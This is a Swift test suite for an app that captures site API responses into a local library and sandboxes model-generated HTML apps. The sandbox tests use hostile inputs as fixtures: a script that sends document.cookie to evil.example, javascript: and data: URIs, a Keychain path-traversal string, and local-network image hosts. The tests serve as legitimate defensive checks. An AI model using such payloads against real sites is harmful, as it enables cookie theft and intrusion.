import Foundation
import ImageIO
import Testing

@testable import ZenticKit

private func libraryFixture(_ name: String) throws -> Any {
    let url = URL(filePath: #filePath)
        .deletingLastPathComponent()
        .deletingLastPathComponent()
        .appending(path: "Fixtures/library/\(name).json")
    return try JSONSerialization.jsonObject(with: Data(contentsOf: url))
}

private func libraryFixtureText(_ name: String) throws -> String {
    let url = URL(filePath: #filePath)
        .deletingLastPathComponent()
        .deletingLastPathComponent()
        .appending(path: "Fixtures/library/\(name).json")
    return try String(contentsOf: url, encoding: .utf8)
}

@Suite("X recipe")
struct XRecipeTests {
    let records: [SourceRecord]

    init() throws {
        let recipe = try #require(SourceRecipe.curated(for: "https://x.com")?.endpoint(for: "graphql/hometimeline"))
        records = RecordMapper.records(
            from: try libraryFixture("x-home-timeline"),
            recipe: recipe,
            source: "https://x.com",
            pageURL: URL(string: "https://x.com/home")
        )
    }

    private func record(_ id: String) -> SourceRecord? { records.first { $0.id == id } }

    /// An ad in someone's private front-end is the one failure that would make
    /// the whole feature pointless.
    @Test func promotedEntriesAreExcluded() {
        #expect(record("1850000000000000099") == nil)
        #expect(!records.contains { $0.text?.contains("Buy our thing") == true })
    }

    /// A repost is the original post, attributed to its author — not "RT @…"
    /// under the reposter's name, and not both.
    @Test func repostsBecomeTheOriginal() throws {
        #expect(record("1850000000000000002") == nil)
        let original = try #require(record("1850000000000000003"))
        #expect(original.authorHandle == "b0rk")
        #expect(original.text?.hasPrefix("new zine page") == true)
        #expect(original.metrics["likes"] == 2100)
    }

    @Test func visibilityWrappersAndLongPostsAreUnwrapped() throws {
        let long = try #require(record("1850000000000000004"))
        #expect(long.text?.hasSuffix("cuts off.") == true, "note_tweet text must win over the truncated legacy text")
        #expect(long.parentID == "1850000000000000001")
        #expect(long.threadID == "1850000000000000001")
    }

    /// What makes "who is talking to me" and "links people shared" answerable.
    @Test func mentionsLinksAndEntities() throws {
        let simon = try #require(record("1850000000000000001"))
        #expect(simon.mentions == ["hamelhusain"])
        #expect(simon.links == ["https://simonwillison.net/2026/Oct/16/sqlite-diffable/"])
        #expect(simon.text?.contains("schemas & migrations") == true, "X's &amp; must not reach an app")
    }

    @Test func fieldsMapFromBothUserShapes() throws {
        let simon = try #require(record("1850000000000000001"))
        #expect(simon.author == "Simon Willison")
        #expect(simon.authorHandle == "simonw")
        #expect(simon.authorAvatar == "https://pbs.twimg.com/profile_images/1/simon_normal.jpg")
        #expect(simon.url == "https://x.com/simonw/status/1850000000000000001")
        #expect(simon.media.count == 2)
        #expect(simon.metrics["views"] == 48211, "string-typed counts are numbers too")
        #expect(simon.publishedAt == Date(timeIntervalSince1970: 1_792_142_042))
        // Cursors and other entries are not records.
        #expect(records.count == 3)
    }
}

@Suite("Endpoint keys and paths")
struct EndpointTests {
    /// X rotates the query id on every deploy. A key that included it would make
    /// every recipe expire weekly.
    @Test func rotatingQueryIDsDoNotChangeTheKey() {
        let a = EndpointKey.of(URL(string: "https://x.com/i/api/graphql/Xq3PmB4fz9aKDl21qQ-a1w/HomeTimeline?variables=1")!)
        let b = EndpointKey.of(URL(string: "https://x.com/i/api/graphql/u8TzzNb5j2a0jFQ9_bVk3A/HomeTimeline")!)
        #expect(a == b)
        #expect(a == "api/graphql/hometimeline")
    }

    @Test func pathsRejectWhatTheyCannotMean() {
        #expect(throws: JSONPath.ParseError.self) { try JSONPath("") }
        #expect(throws: JSONPath.ParseError.self) { try JSONPath("$..") }
        #expect(throws: JSONPath.ParseError.self) { try JSONPath("a[0]") }
        #expect(throws: JSONPath.ParseError.self) { try JSONPath("a[*") }
    }

    /// Mis-mapped fields must not become dates that pin a record to the top, or
    /// values the store cannot decode again.
    @Test func implausibleDatesAreRejected() {
        #expect(DateParsing.parse("nan") == nil)
        #expect(DateParsing.parse("2026") == nil, "a year is not a timestamp")
        #expect(DateParsing.parse("1850000000000000001") == nil, "a snowflake id is not a date")
        #expect(DateParsing.parse("1792142042") == Date(timeIntervalSince1970: 1_792_142_042))
        #expect(DateParsing.parse("1792142042000") == Date(timeIntervalSince1970: 1_792_142_042))
        #expect(DateParsing.parse("2026-10-16T09:14:02.123Z") != nil)
    }

    @Test func templatesWithMissingFieldsYieldNoURL() {
        let record = SourceRecord(source: "https://x.com", id: "1", kind: .post)
        #expect(RecordMapper.fill("https://x.com/{authorHandle}/status/{id}", from: record) == nil)
    }

    /// A site's JSON can hold any string; only web links may become a record URL.
    @Test func onlyWebURLsSurvive() {
        #expect(RecordMapper.absolute("javascript:alert(1)", against: nil) == nil)
        #expect(RecordMapper.absolute("/post/1", against: URL(string: "https://example.com/feed")) == "https://example.com/post/1")
    }
}

@Suite("Record store")
struct RecordStoreTests {
    @Test func seeingARecordAgainRefreshesItWithoutLosingHistory() throws {
        let store = try RecordStore(url: nil)
        let first = Date(timeIntervalSince1970: 1_000)
        let later = Date(timeIntervalSince1970: 2_000)
        try store.upsert([
            SourceRecord(source: "https://x.com", id: "1", kind: .post, text: "hello", author: "A",
                   metrics: ["likes": 1, "replies": 4], firstSeen: first, lastSeen: first)
        ])
        // A thread response: same post, fresher likes, no author, no replies count.
        try store.upsert([
            SourceRecord(source: "https://x.com", id: "1", kind: .post, text: "hello",
                   metrics: ["likes": 9], firstSeen: later, lastSeen: later)
        ])
        let record = try #require(try store.record(source: "https://x.com", id: "1"))
        #expect(record.firstSeen == first)
        #expect(record.lastSeen == later)
        #expect(record.author == "A")
        #expect(record.metrics == ["likes": 9, "replies": 4])
    }

    /// The scheme handler passes an app's declared sources; nothing an app puts in
    /// its query may widen them.
    @Test func queriesCannotEscapeTheirAllowedSources() throws {
        let store = try RecordStore(url: nil)
        try store.upsert([
            SourceRecord(source: "https://x.com", id: "1", kind: .post, text: "mine"),
            SourceRecord(source: "https://mail.example", id: "2", kind: .item, text: "private"),
        ])
        let asked = RecordQuery(sources: ["https://mail.example", "https://x.com"])
        let records = try store.records(matching: asked, allowedSources: ["https://x.com"])
        #expect(records.map(\.id) == ["1"])
        #expect(try store.records(matching: RecordQuery(sources: ["https://mail.example"]), allowedSources: ["https://x.com"]).isEmpty)
    }

    @Test func limitIsClamped() throws {
        let store = try RecordStore(url: nil)
        try store.upsert((0..<5).map { SourceRecord(source: "s", id: "\($0)", kind: .post, text: "t") })
        #expect(try store.records(matching: RecordQuery(limit: -3), allowedSources: ["s"]).count == 1)
        #expect(try store.records(matching: RecordQuery(limit: 10_000_000), allowedSources: ["s"]).count == 5)
    }

    /// An inbox: mentions and replies to the user's posts, not the user's own
    /// posts, and not someone whose handle merely starts the same way.
    @Test func addressedToFindsMentionsAndReplies() throws {
        let store = try RecordStore(url: nil)
        try store.upsert([
            SourceRecord(source: "s", id: "mine", kind: .post, text: "my post", authorHandle: "luka"),
            SourceRecord(source: "s", id: "reply", kind: .post, text: "nice", authorHandle: "ann", parentID: "mine"),
            SourceRecord(source: "s", id: "mention", kind: .post, text: "cc", authorHandle: "bo", mentions: ["luka"]),
            SourceRecord(source: "s", id: "other", kind: .post, text: "x", authorHandle: "cy", mentions: ["lukas"]),
            SourceRecord(source: "s", id: "self", kind: .post, text: "me again", authorHandle: "luka", parentID: "mine"),
            SourceRecord(source: "t", id: "elsewhere", kind: .post, text: "y", authorHandle: "dee", parentID: "mine"),
        ])
        let found = try store.records(matching: RecordQuery(addressedTo: "@Luka"), allowedSources: ["s", "t"])
        #expect(Set(found.map(\.id)) == ["reply", "mention"])
    }

    @Test func searchIsLiteralNotAPattern() throws {
        let store = try RecordStore(url: nil)
        try store.upsert([
            SourceRecord(source: "s", id: "1", kind: .post, text: "100% sure"),
            SourceRecord(source: "s", id: "2", kind: .post, text: "100 percent"),
        ])
        #expect(try store.records(matching: RecordQuery(search: "100%"), allowedSources: ["s"]).map(\.id) == ["1"])
    }

    @Test func rawResponsesAreCappedPerSource() throws {
        let store = try RecordStore(url: nil)
        for index in 0..<(LibraryBudget.rawResponsesPerSource + 5) {
            try store.appendRaw(.init(origin: "s", endpoint: "e", url: "https://s/\(index)", capturedAt: .now, body: Data("{}".utf8)))
        }
        try store.appendRaw(.init(origin: "other", endpoint: "e", url: "https://o", capturedAt: .now, body: Data("{}".utf8)))
        let kept = try store.rawResponses(origin: "s")
        #expect(kept.count == LibraryBudget.rawResponsesPerSource)
        #expect(kept.last?.url == "https://s/\(LibraryBudget.rawResponsesPerSource + 4)", "the newest are the ones kept")
        #expect(try store.rawResponses(origin: "other").count == 1)
    }
}

/// Stands in for the model. Counts calls, so "asks once" is checkable.
private actor FakeInferrer: RecipeInferring {
    var calls = 0
    var shapes: [String] = []
    let recipe: EndpointRecipe?

    init(recipe: EndpointRecipe?) { self.recipe = recipe }

    func inferEndpointRecipe(shape: String) async throws -> EndpointRecipe {
        calls += 1
        shapes.append(shape)
        guard let recipe else { throw DesignError.malformed("fake") }
        return recipe
    }
}

@Suite("Library ingest")
struct LibraryIngestTests {
    static let feedRecipe = EndpointRecipe(
        endpoint: "",
        items: "$.items[*]",
        kind: .item,
        fields: FieldMap(id: ["id"], title: ["title"], url: ["link"])
    )

    static func capture(_ body: String, url: String = "https://news.example/api/v2/feed") -> CapturePayload {
        CapturePayload(url: url, via: .fetch, body: body)
    }

    @Test func nothingIsRecordedOnASiteThatIsNotASource() async throws {
        let library = try SourceLibrary(url: nil, inferrer: nil)
        let outcome = await library.ingest(
            Self.capture(#"{"items":[{"id":"1","title":"t"}]}"#),
            pageOrigin: "https://news.example",
            pageURL: nil
        )
        #expect(outcome == .ignored)
    }

    /// A response that arrives before its recipe is stored, then mapped once the
    /// recipe exists — and the model is asked once for a burst, not per response.
    @Test func capturesWaitForTheirRecipeAndAreMappedWhenItArrives() async throws {
        let inferrer = FakeInferrer(recipe: Self.feedRecipe)
        let library = try SourceLibrary(url: nil, inferrer: inferrer)
        try await library.addSource(origin: "https://news.example", title: "News", homeURL: "https://news.example", refresh: .background)

        let body = #"{"items":[{"id":"1","title":"First","link":"/a/1"},{"id":"2","title":"Second","link":"/a/2"}]}"#
        let outcome = await library.ingest(Self.capture(body), pageOrigin: "https://news.example", pageURL: URL(string: "https://news.example/"))
        #expect(outcome == .awaitingRecipe(endpoint: "api/v2/feed"))

        let records = await library.records(matching: RecordQuery(), allowedSources: ["https://news.example"])
        #expect(Set(records.map(\.id)) == ["1", "2"])
        #expect(records.first { $0.id == "1" }?.url == "https://news.example/a/1")

        // Now the recipe exists: the next response maps directly, no model call.
        _ = await library.ingest(Self.capture(#"{"items":[{"id":"3","title":"Third"}]}"#), pageOrigin: "https://news.example", pageURL: nil)
        #expect(await inferrer.calls == 1)
        #expect(await library.recordCount(source: "https://news.example") == 3)
    }

    /// A failing model must not be called on every scroll.
    @Test func failedInferenceIsNotRetriedImmediately() async throws {
        let inferrer = FakeInferrer(recipe: nil)
        let library = try SourceLibrary(url: nil, inferrer: inferrer)
        try await library.addSource(origin: "https://news.example", title: "News", homeURL: "https://news.example", refresh: .background)
        for _ in 0..<5 {
            _ = await library.ingest(Self.capture(#"{"items":[]}"#), pageOrigin: "https://news.example", pageURL: nil)
        }
        #expect(await inferrer.calls == 1)
    }

    /// The model's own "no records here" becomes a verdict, so a settings endpoint
    /// does not cost a model call per page load.
    @Test func modelVerdictsStand() async throws {
        let inferrer = FakeInferrer(recipe: EndpointRecipe(endpoint: "", items: nil))
        let library = try SourceLibrary(url: nil, inferrer: inferrer)
        try await library.addSource(origin: "https://news.example", title: "News", homeURL: "https://news.example", refresh: .background)
        let settings = Self.capture(#"{"theme":"dark","flags":{"a":true}}"#, url: "https://news.example/api/settings")
        _ = await library.ingest(settings, pageOrigin: "https://news.example", pageURL: nil)
        #expect(await library.ingest(settings, pageOrigin: "https://news.example", pageURL: nil) == .ignored)
        #expect(await inferrer.calls == 1)
    }

    /// An endpoint whose first response was empty must not be closed for good by
    /// a recipe that simply had nothing to map yet.
    @Test func anEmptyFirstResponseDoesNotCloseTheEndpoint() async throws {
        let inferrer = FakeInferrer(recipe: Self.feedRecipe)
        let library = try SourceLibrary(url: nil, inferrer: inferrer)
        try await library.addSource(origin: "https://news.example", title: "News", homeURL: "https://news.example", refresh: .background)
        _ = await library.ingest(Self.capture(#"{"items":[]}"#), pageOrigin: "https://news.example", pageURL: nil)
        let later = await library.ingest(Self.capture(#"{"items":[{"id":"1","title":"Now there is one"}]}"#), pageOrigin: "https://news.example", pageURL: nil)
        #expect(later == .mapped(1))
    }

    /// `/users/bob/posts` reuses what `/users/alice/posts` taught, without a call —
    /// and the model never sees either path.
    @Test func knownRecipesAreTriedBeforeTheModel() async throws {
        let inferrer = FakeInferrer(recipe: Self.feedRecipe)
        let library = try SourceLibrary(url: nil, inferrer: inferrer)
        try await library.addSource(origin: "https://news.example", title: "News", homeURL: "https://news.example", refresh: .background)
        _ = await library.ingest(Self.capture(#"{"items":[{"id":"1","title":"a"}]}"#, url: "https://news.example/users/alice/posts"), pageOrigin: "https://news.example", pageURL: nil)
        _ = await library.ingest(Self.capture(#"{"items":[{"id":"2","title":"b"}]}"#, url: "https://news.example/users/bob/posts"), pageOrigin: "https://news.example", pageURL: nil)
        #expect(await inferrer.calls == 1)
        #expect(await library.recordCount(source: "https://news.example") == 2)
        let sent = await inferrer.shapes.joined()
        #expect(!sent.contains("alice") && !sent.contains("bob"))
    }

    /// When a site changes shape, the recipe that used to work maps nothing. That
    /// must lead back to the model, not to an app that silently stops updating.
    @Test func aRecipeThatStopsYieldingIsRelearned() async throws {
        let inferrer = FakeInferrer(recipe: EndpointRecipe(
            endpoint: "", items: "$..posts[*]", kind: .item, fields: FieldMap(id: ["pid"], title: ["headline"])
        ))
        let library = try SourceLibrary(url: nil, inferrer: inferrer)
        try await library.addSource(origin: "https://news.example", title: "News", homeURL: "https://news.example", refresh: .background)
        // Learn the old shape, then let it yield.
        try await library.adopt(Self.feedRecipe, origin: "https://news.example", endpoint: "api/v2/feed")
        _ = await library.ingest(Self.capture(#"{"items":[{"id":"1","title":"old shape"}]}"#), pageOrigin: "https://news.example", pageURL: nil)
        #expect(await inferrer.calls == 0)

        // The site redesigns: same endpoint, new shape, big enough to count.
        let padding = String(repeating: "x", count: LibraryBudget.staleRecipeMinBytes)
        let redesigned = #"{"pad":"\#(padding)","data":{"posts":[{"pid":"9","headline":"new shape"}]}}"#
        for _ in 0..<LibraryBudget.staleRecipeStreak {
            _ = await library.ingest(Self.capture(redesigned), pageOrigin: "https://news.example", pageURL: nil)
        }
        #expect(await inferrer.calls == 1)
        let records = await library.records(matching: RecordQuery(), allowedSources: ["https://news.example"])
        #expect(records.contains { $0.id == "9" }, "the stored redesigned responses are re-mapped")
    }

    /// A page can invent endpoints; it must not be able to spend the user's key.
    @Test func inferenceIsCappedPerSourcePerDay() async throws {
        let inferrer = FakeInferrer(recipe: nil)
        let library = try SourceLibrary(url: nil, inferrer: inferrer)
        try await library.addSource(origin: "https://news.example", title: "News", homeURL: "https://news.example", refresh: .background)
        for index in 0..<(LibraryBudget.recipeInferencesPerSourcePerDay + 10) {
            _ = await library.ingest(Self.capture(#"{"a":1}"#, url: "https://news.example/made/up/e\(index)"), pageOrigin: "https://news.example", pageURL: nil)
        }
        #expect(await inferrer.calls == LibraryBudget.recipeInferencesPerSourcePerDay)
    }

    @Test func mediaIsQueuedAtCaptureFromAllowedHostsOnly() async throws {
        let library = try SourceLibrary(url: nil, inferrer: nil)
        try await library.addSource(origin: "https://x.com", title: "X", homeURL: "https://x.com/home", refresh: .browse)
        _ = await library.ingest(
            CapturePayload(url: "https://x.com/i/api/graphql/q/HomeTimeline", via: .fetch, body: try libraryFixtureText("x-home-timeline")),
            pageOrigin: "https://x.com", pageURL: nil
        )
        let queued = await library.takePendingMedia()
        #expect(queued.contains("https://pbs.twimg.com/media/A1.jpg"))
        #expect(queued.allSatisfy { $0.hasPrefix("https://pbs.twimg.com/") })
        #expect(await library.takePendingMedia().isEmpty, "draining empties the queue")
    }

    /// Curated recipes apply from the first capture, with no model involved.
    @Test func xNeedsNoInference() async throws {
        let inferrer = FakeInferrer(recipe: nil)
        let library = try SourceLibrary(url: nil, inferrer: inferrer)
        try await library.addSource(origin: "https://x.com", title: "X", homeURL: "https://x.com/home", refresh: .browse)
        let outcome = await library.ingest(
            CapturePayload(url: "https://x.com/i/api/graphql/abcDEF123456789xyz/HomeTimeline", via: .fetch, body: try libraryFixtureText("x-home-timeline")),
            pageOrigin: "https://x.com",
            pageURL: URL(string: "https://x.com/home")
        )
        #expect(outcome == .mapped(3))
        #expect(await inferrer.calls == 0)
    }
}

@Suite("App sandbox")
struct AppSandboxTests {
    let nonce = "0123456789abcdef0123456789abcdef"
    let app = "0123456789abcdef0123456789abcdef"

    /// The policy must be in force before a single byte the model wrote is parsed.
    @Test func policyPrecedesTheModelsHTML() throws {
        let hostile = "<script>fetch('https://evil.example/?d='+document.cookie)</script><!doctype html><html><head>"
        let document = AppSandbox.document(html: hostile, appID: app, nonce: nonce, configJSON: "{}")
        let policy = try #require(document.range(of: "Content-Security-Policy"))
        let model = try #require(document.range(of: "evil.example"))
        #expect(policy.lowerBound < model.lowerBound)
        #expect(document.hasPrefix("<!doctype html><meta charset=\"utf-8\"><meta http-equiv=\"Content-Security-Policy\""))
    }

    /// Markup inside captured text arrives after load and has no nonce; inline
    /// handlers are blocked because there is no 'unsafe-inline'.
    @Test func scriptsNeedTheNonceAndNothingInlineRuns() {
        let csp = AppSandbox.contentSecurityPolicy(appID: app, nonce: nonce)
        let script = csp.split(separator: ";").first { $0.contains("script-src") } ?? ""
        #expect(!script.contains("unsafe-inline"))
        #expect(!script.contains("unsafe-eval"))
        #expect(script.contains("'nonce-\(nonce)'"))
        #expect(csp.hasPrefix("default-src 'none'"))
        #expect(!csp.contains("https:"), "no directive may allow the network")
        #expect(!csp.contains("*"))
    }

    @Test func theModelCannotChooseItsOwnNonce() {
        let stamped = AppSandbox.stampingNonce(nonce, on: #"<script nonce="mine">a()</script><SCRIPT>b()</SCRIPT><scripting>"#)
        #expect(stamped.contains(#"<script nonce="\#(nonce)" nonce="mine">"#))
        #expect(stamped.contains(#"<script nonce="\#(nonce)">b()"#))
        #expect(stamped.contains("<scripting>"), "only script start tags are stamped")
    }

    @Test func configCannotCloseItsScript() {
        let document = AppSandbox.document(html: "", appID: app, nonce: nonce, configJSON: #"{"name":"</script><script>x()</script>"}"#)
        #expect(!document.contains("</script><script>x()"))
    }

    /// Script can "click" a link it built (WebKit reports `a.click()` as a link
    /// activation), so a click alone opens nothing the app was not given.
    @Test func onlyLinksTheAppWasGivenOpenWithoutAsking() {
        var allowance = AppSandbox.LinkAllowance()
        allowance.note([
            SourceRecord(source: "https://x.com", id: "185", kind: .post, url: "https://x.com/simonw/status/185",
                   text: "t", links: ["https://simonwillison.net/post"])
        ])
        func decide(_ string: String, link: Bool = true) -> AppSandbox.Navigation {
            AppSandbox.decide(target: URL(string: string)!, appID: app, isLinkActivation: link, allowance: allowance)
        }
        let exfil = "https://evil.example/?d=everything"
        #expect(decide(exfil) == .confirm(URL(string: exfil)!))
        #expect(decide(exfil, link: false) == .cancel)
        #expect(decide("https://x.com/simonw/status/185") == .openInNewTab(URL(string: "https://x.com/simonw/status/185")!))
        #expect(decide("https://x.com/simonw/status/185#replies") == .openInNewTab(URL(string: "https://x.com/simonw/status/185#replies")!))
        #expect(decide("https://simonwillison.net/post") == .openInNewTab(URL(string: "https://simonwillison.net/post")!))
        #expect(decide("https://x.com/intent/post?in_reply_to=185") == .openInNewTab(URL(string: "https://x.com/intent/post?in_reply_to=185")!))
        // An intent for a record it was not given, or one carrying text, asks first.
        #expect(decide("https://x.com/intent/like?tweet_id=999") == .confirm(URL(string: "https://x.com/intent/like?tweet_id=999")!))
        #expect(decide("https://x.com/intent/post?in_reply_to=185&text=secret") == .confirm(URL(string: "https://x.com/intent/post?in_reply_to=185&text=secret")!))
        #expect(decide("zentic://\(app)/#thread", link: false) == .allow)
        #expect(decide("zentic://ffffffffffffffffffffffffffffffff/") == .cancel)
        for escape in ["data:text/html,<script>x()</script>", "javascript:x()", "about:blank", "blob:zentic://a/b"] {
            #expect(decide(escape) == .cancel, "\(escape)")
        }
    }

    /// The media cache is a native fetch outside every sandbox; a site's JSON gets
    /// the narrowest reading of where images may come from.
    @Test func mediaPolicyIsNarrow() {
        let x = "https://x.com"
        #expect(MediaPolicy.allows("https://pbs.twimg.com/a.jpg", source: x, extraHosts: ["pbs.twimg.com"]))
        #expect(!MediaPolicy.allows("https://pbs.twimg.com/a.jpg", source: x, extraHosts: []))
        #expect(MediaPolicy.allows("https://img.example.com/a.jpg", source: "https://www.example.com", extraHosts: []))
        for hostile in ["http://x.com/a.jpg", "https://192.168.1.1/a.jpg", "https://[::1]/a.jpg", "https://localhost/a.jpg",
                        "https://router.local/a.jpg", "https://evil.co.uk/a.jpg"] {
            #expect(!MediaPolicy.allows(hostile, source: "https://www.bbc.co.uk", extraHosts: []), "\(hostile)")
        }
    }

    /// An app is handed local media paths only. A remote URL it could load would
    /// be a request per render, to the source's CDN.
    @Test func appsNeverSeeRemoteMedia() {
        let record = SourceRecord(source: "https://x.com", id: "1", kind: .post, text: "t",
                            authorAvatar: "https://pbs.twimg.com/a.jpg",
                            media: ["https://pbs.twimg.com/1.jpg", "https://pbs.twimg.com/2.jpg"])
        let cached = ["https://pbs.twimg.com/1.jpg": MediaCache.key(for: "https://pbs.twimg.com/1.jpg")]
        let exposed = AppSandbox.exposed([record], cachedKeys: cached, appID: app)[0]
        #expect(exposed.authorAvatar == nil)
        #expect(exposed.media == ["zentic://\(app)/media/\(MediaCache.key(for: "https://pbs.twimg.com/1.jpg"))"])
    }

    @Test func mediaKeysArePathSafe() {
        #expect(MediaCache.isValidKey(MediaCache.key(for: "https://x/y.jpg")))
        #expect(!MediaCache.isValidKey("../../Library/Keychains/login.keychain-db"))
        #expect(!GeneratedApp.isValidID("../apps"))
    }
}

@Suite("What reaches a model")
struct ModelBoundaryTests {
    /// Recipe inference sees structure only. Every value in this response is a
    /// sentinel; none may appear in what would be sent.
    @Test func shapeSummaryCarriesNoValues() throws {
        let sentinel = "SENTINEL"
        let response: [String: Any] = [
            "data": [
                "items": [
                    ["id": "\(sentinel)-1850000000000000001", "text": "\(sentinel) a whole private sentence here",
                     "author": ["name": "\(sentinel)Name", "handle": "\(sentinel)handle"],
                     "link": "https://\(sentinel.lowercased()).example/p/1", "likes": 7, "at": "2026-10-16T09:14:02Z"],
                    ["id": "\(sentinel)-2", "text": "\(sentinel) another", "likes": 1],
                ],
                // A map keyed by ids: the keys are data, not field names.
                "usersById": ["98765432101234": ["n": "\(sentinel)Map"], "12345678909876": ["n": "\(sentinel)Map2"]],
                "byEmail": ["\(sentinel.lowercased())@example.com": ["n": "x"]],
            ]
        ]
        let shape = ShapeSummary.describe(response)
        #expect(!shape.localizedCaseInsensitiveContains(sentinel), "\(shape)")
        #expect(!shape.contains("98765432101234"))
        #expect(shape.contains("text: text(~20)"))
        #expect(shape.contains("<key ×2>"))
    }

    /// The brief sends samples with their media swapped for placeholders, so a
    /// model can neither hard-code a CDN URL nor be told one.
    @Test func briefsCarryNoRemoteMedia() {
        let brief = AppBrief(
            request: "a timeline",
            sources: [.init(origin: "https://x.com", title: "x.com", recordCount: 1, kinds: [.post])],
            samples: [SourceRecord(source: "https://x.com", id: "1", kind: .post, text: "hi",
                             authorAvatar: "https://pbs.twimg.com/a.jpg", media: ["https://pbs.twimg.com/1.jpg"])]
        )
        let message = brief.userMessage()
        #expect(!message.contains("pbs.twimg.com"))
        #expect(message.contains("<image-1>"))
    }

    @Test func samplesAreFewAndTrimmed() async throws {
        let library = try SourceLibrary(url: nil, inferrer: nil)
        try await library.addSource(origin: "https://x.com", title: "X", homeURL: "https://x.com", refresh: .browse)
        _ = await library.ingest(
            CapturePayload(url: "https://x.com/i/api/graphql/q/HomeTimeline", via: .fetch, body: try libraryFixtureText("x-home-timeline")),
            pageOrigin: "https://x.com", pageURL: nil
        )
        // Pad the source well past the sample count.
        let long = String(repeating: "word ", count: 400)
        for index in 0..<20 {
            _ = await library.ingest(
                CapturePayload(
                    url: "https://x.com/i/api/graphql/q/HomeTimeline", via: .fetch,
                    body: #"{"itemContent":{"tweet_results":{"result":{"rest_id":"9\#(index)","legacy":{"full_text":"\#(long)"}}}}}"#
                ),
                pageOrigin: "https://x.com", pageURL: nil
            )
        }
        let samples = await library.samples(for: ["https://x.com"])
        #expect(samples.count == LibraryBudget.appSampleRecords)
        #expect(samples.allSatisfy { ($0.text?.count ?? 0) <= LibraryBudget.appSampleTextLength + 1 })
    }
}

@Suite("Capture scripts")
@MainActor
struct CaptureScriptTests {
    /// Nothing of Zentic's runs in a page's own world unless there is a source.
    @Test func noSourcesMeansNoPageWorldScript() {
        let plain = InPageScript.userScripts(SiteBook().inPageConfig(), consent: false)
        let empty = InPageScript.userScripts(SiteBook().inPageConfig(), consent: false, capture: .init(sites: []))
        #expect(plain.count == empty.count)
        let with = InPageScript.userScripts(SiteBook().inPageConfig(), consent: false, capture: .init(sites: ["x.com"]))
        #expect(with.count == plain.count + 1)
    }

    @Test func theRecorderIsBakedWithItsSitesAndChannel() {
        let capture = InPageScript.Capture(sites: ["x.com", "news.example"], channel: "zc0123")
        let script = InPageScript.recorderScript(capture)
        #expect(!script.contains("__ZENTIC_CAPTURE_SITES__"))
        #expect(!script.contains("__ZENTIC_CAPTURE_CHANNEL__"))
        #expect(script.contains(#"["news.example","x.com"]"#))
        #expect(script.contains("zc0123"))
    }

    /// Each tab's channel is its own, so one page cannot learn another's.
    @Test func channelsAreUnguessable() {
        let a = InPageScript.Capture.newChannel(), b = InPageScript.Capture.newChannel()
        #expect(a != b)
        #expect(a.count >= 32)
    }

    @Test func theBootstrapNamesTheChannelOnlyThroughTheSourceList() {
        let capture = InPageScript.Capture(sites: ["x.com"], channel: "zcSECRET")
        let bootstrap = InPageScript.bootstrap(SiteBook().inPageConfig(), capture: capture)
        #expect(bootstrap.contains(#"["x.com"].includes(key) ? "zcSECRET" : null"#))
        #expect(InPageScript.bootstrap(SiteBook().inPageConfig()).contains("[].includes(key)"))
    }
}

@Suite("Background refresh pacing")
struct RefreshScheduleTests {
    let start = Date(timeIntervalSince1970: 1_792_000_000)
    var calendar: Calendar {
        var calendar = Calendar(identifier: .gregorian)
        calendar.timeZone = TimeZone(identifier: "UTC")!
        return calendar
    }

    /// Never sooner than the interval, and the jitter only ever adds.
    @Test func visitsWaitTheIntervalPlusJitter() {
        let schedule = RefreshSchedule(interval: 3600, perDay: 100, jitter: 0.5)
        #expect(schedule.mayVisit(now: start, previous: [], roll: 0, calendar: calendar))
        #expect(!schedule.mayVisit(now: start.addingTimeInterval(3599), previous: [start], roll: 0, calendar: calendar))
        #expect(schedule.mayVisit(now: start.addingTimeInterval(3600), previous: [start], roll: 0, calendar: calendar))
        #expect(!schedule.mayVisit(now: start.addingTimeInterval(5000), previous: [start], roll: 1, calendar: calendar))
        #expect(schedule.mayVisit(now: start.addingTimeInterval(5400), previous: [start], roll: 1, calendar: calendar))
    }

    /// A day's cap holds however the visits fell.
    @Test func theDailyCapHolds() {
        let schedule = RefreshSchedule(interval: 60, perDay: 3, jitter: 0)
        let morning = calendar.startOfDay(for: start).addingTimeInterval(3600)
        let three = (0..<3).map { morning.addingTimeInterval(Double($0) * 120) }
        #expect(!schedule.mayVisit(now: morning.addingTimeInterval(4 * 3600), previous: three, roll: 0, calendar: calendar))
        #expect(schedule.mayVisit(now: morning.addingTimeInterval(24 * 3600), previous: three, roll: 0, calendar: calendar))
    }

    /// Signed in is slower and rarer than signed out — somebody's account.
    @Test func signedInIsTheGentlerSchedule() {
        #expect(RefreshSchedule.session.interval > RefreshSchedule.signedOut.interval)
        #expect(RefreshSchedule.session.perDay <= LibraryBudget.sessionVisitsPerDay)
        #expect(RefreshSchedule.session.perDay < RefreshSchedule.signedOut.perDay)
    }
}

@Suite("App icons")
struct AppIconTests {
    /// The icon prompt is about the app — its name and the user's own words —
    /// and never carries a record.
    @Test func theIconBriefCarriesOnlyNameAndRequest() {
        let brief = AppIconBrief(name: "Replies", request: String(repeating: "calm inbox ", count: 200))
        #expect(brief.prompt.contains("\"Replies\""))
        #expect(brief.request.count == 600)
        #expect(brief.prompt.contains("No text"))
    }

    /// What is kept is a small PNG Zentic drew itself, whatever arrived.
    @Test func picturesAreReencodedSmall() throws {
        let side = 1024
        let context = try #require(CGContext(
            data: nil, width: side, height: side, bitsPerComponent: 8, bytesPerRow: 0,
            space: CGColorSpaceCreateDeviceRGB(), bitmapInfo: CGImageAlphaInfo.premultipliedLast.rawValue))
        context.setFillColor(CGColor(red: 0.2, green: 0.4, blue: 0.9, alpha: 1))
        context.fill(CGRect(x: 0, y: 0, width: side, height: side))
        let image = try #require(context.makeImage())
        let data = NSMutableData()
        let destination = try #require(CGImageDestinationCreateWithData(data, "public.png" as CFString, 1, nil))
        CGImageDestinationAddImage(destination, image, nil)
        #expect(CGImageDestinationFinalize(destination))

        let png = try #require(AppIconImage.thumbnail(data as Data, pixels: 256))
        let source = try #require(CGImageSourceCreateWithData(png as CFData, nil))
        let small = try #require(CGImageSourceCreateImageAtIndex(source, 0, nil))
        #expect(max(small.width, small.height) == 256)
        #expect(png.count < (data as Data).count)
        #expect(AppIconImage.thumbnail(Data("<svg onload=x()>".utf8), pixels: 256) == nil)
    }
}

@Suite("API key errors")
struct APIKeyErrorTests {
    /// What Settings shows must be the Keychain's reason, not an enum ordinal.
    @Test func keychainFailuresSayWhy() {
        let message = APIKeyError.keychain(errSecDuplicateItem).localizedDescription
        #expect(!message.contains("error 0"))
        #expect(message.contains("Keychain"))
        #expect(message.lowercased().contains("already exists"))
    }
}
